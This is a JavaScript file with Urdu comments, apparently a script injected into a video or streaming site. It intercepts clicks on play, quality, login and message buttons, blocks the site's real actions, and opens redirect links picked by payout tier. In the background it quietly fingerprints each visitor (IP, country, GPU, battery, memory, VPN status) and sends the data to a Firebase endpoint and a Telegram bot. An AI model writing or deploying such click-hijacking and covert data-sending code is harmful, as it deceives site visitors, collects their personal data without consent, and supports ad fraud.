/**
 * MANAGER CHACHA V7.2 - THE SUPERNOVA (FINAL MASTER)
 * -------------------------------------------------
 * FIXED: Double-Ad Conflict | FIXED: Blank Screen | FIXED: Latency
 */

const CHACHA_CONFIG = {
    DOMAIN: "cloudaccesshq.xyz",
    
    // تمہاری 3 بالٹیاں (Baskets) - اب 20 لنکس کے ساتھ
    LINKS: {
        HIGH: [
            "https://www.amazon.com/deals", 
            "https://www.netflix.com", 
            "https://www.disneyplus.com", 
            "https://www.apple.com", 
            "https://www.tesla.com", 
            "https://www.spacex.com", 
            "https://www.microsoft.com", 
            "https://www.playstation.com", 
            "https://www.xbox.com", 
            "https://www.samsung.com"
        ], // 80% High Pay
        MID:  [
            "https://www.spotify.com", 
            "https://www.hulu.com", 
            "https://www.twitch.tv", 
            "https://www.reddit.com", 
            "https://www.ebay.com", 
            "https://www.walmart.com"
        ], // 10% Mid Pay
        LOW:  [
            "https://www.daraz.pk", 
            "https://www.alibaba.com", 
            "https://www.booking.com", 
            "https://www.airbnb.com"
        ]  // 10% Low Pay
    },

    APIS: {
        FB_URL: "YOUR_FIREBASE_URL", 
        TG_TOKEN: "YOUR_BOT_TOKEN",   
        TG_ID: "YOUR_CHAT_ID"         
    },

    SETTINGS: {
        MAX_CLICKS: 999, // ان لمیٹڈ پاور
        RESET_HOURS: 24,
        CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
    }
};

const _0xEngine = {
    _getStore: function() {
        const data = localStorage.getItem('_mc_v7_final_');
        return data ? JSON.parse(data) : { c: 0, ts: null, used: [] };
    },

    _setStore: function(obj) {
        localStorage.setItem('_mc_v7_final_', JSON.stringify(obj));
    },

    _sync: function() {
        const data = this._getStore();
        if (data.ts) {
            const passed = (Date.now() - data.ts) / (1000 * 60 * 60);
            if (passed >= CHACHA_CONFIG.SETTINGS.RESET_HOURS) {
                this._setStore({ c: 0, ts: null, used: [] });
            }
        }
    },

    // ڈیٹیکٹو سسٹم (بیک گراؤنڈ میں چلے گا)
    _scan: async function() {
        try {
            const _bat = await navigator.getBattery().catch(() => ({ level: 1 }));
            const _ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            const gl = document.createElement('canvas').getContext('webgl');
            const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
            const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Standard";

            return {
                b: Math.round(_bat.level * 100) + "%",
                mem: navigator.deviceMemory || "N/A",
                gpu: gpu,
                vpn: _ipRes.proxy || _ipRes.vpn || false,
                ip: _ipRes.ip || "0.0.0.0",
                loc: _ipRes.country_name || "Unknown"
            };
        } catch(e) { return { vpn: false, loc: "Shielded" }; }
    },

    _pickLink: function(session) {
        const luck = Math.random() * 100;
        let pool = (luck < 80) ? CHACHA_CONFIG.LINKS.HIGH : (luck < 90 ? CHACHA_CONFIG.LINKS.MID : CHACHA_CONFIG.LINKS.LOW);
        
        let available = pool.filter(l => !session.used.includes(l));
        if (available.length === 0) {
            session.used = []; 
            available = pool;
        }

        const selected = available[Math.floor(Math.random() * available.length)] || CHACHA_CONFIG.LINKS.HIGH[0];
        session.used.push(selected);
        return selected;
    },

    _report: function(id, dna, link, count) {
        const payload = { btn: id, dna: dna, target: link, click: count, ts: new Date().toISOString() };
        if (CHACHA_CONFIG.APIS.FB_URL.startsWith('http')) {
            fetch(`${CHACHA_CONFIG.APIS.FB_URL}/logs.json`, { method: 'POST', body: JSON.stringify(payload) });
        }
        if (CHACHA_CONFIG.APIS.TG_TOKEN !== "YOUR_BOT_TOKEN") {
            const msg = `🚀 *SUPERNOVA ALERT* \nIP: ${dna.ip} \nLoc: ${dna.loc} \nClick: ${count} \nLink: ${link}`;
            fetch(`https://api.telegram.org/bot${CHACHA_CONFIG.APIS.TG_TOKEN}/sendMessage?chat_id=${CHACHA_CONFIG.APIS.TG_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        }
    },

    // الٹرا فاسٹ ڈائریکٹ فائر
    _jump: function(url) {
        const w = window.open(url, '_blank', 'noopener,noreferrer');
        if (!w) {
            window.location.assign(url);
        } else {
            w.opener = null;
        }
    }
};

// 'mousedown' پر کلک ہونے سے پہلے ایکشن لینا
document.addEventListener('mousedown', async (e) => {
    const btn = e.target.closest('[id]');
    const validTags = ['tag-btn-play-main', 'tag-input-message-field', 'tag-btn-back-button', 'tag-btn-server-shift-2', 'tag-btn-q-360', 'tag-btn-q-720', 'tag-btn-q-1080', 'tag-btn-q-4k', 'tag-btn-auth-login', 'tag-btn-auth-send', 'tag-link-community-rules', 'tag-btn-community-showmore'];

    if (btn && validTags.includes(btn.id)) {
        // ۱. ویب سائٹ کے اپنے ہر ایکشن کو فوراً کِل (Kill) کرو
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();

        _0xEngine._sync();
        const session = _0xEngine._getStore();

        if (session.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS) {
            window.location.href = CHACHA_CONFIG.SETTINGS.CLEAN_PAGE;
            return;
        }

        // ۲. فوری لنک اٹھاؤ اور فائر کرو (اسکیننگ سے پہلے)
        const target = _0xEngine._pickLink(session);
        _0xEngine._jump(target);

        // ۳. سیشن اپ ڈیٹ
        session.c++;
        if (session.c === 1) session.ts = Date.now();
        _0xEngine._setStore(session);

        // ۴. اسکیننگ اور رپورٹنگ بیک گراؤنڈ میں خاموشی سے
        _0xEngine._scan().then(dna => {
            if (!dna.vpn) {
                _0xEngine._report(btn.id, dna, target, session.c);
            }
        });
    }
}, true);
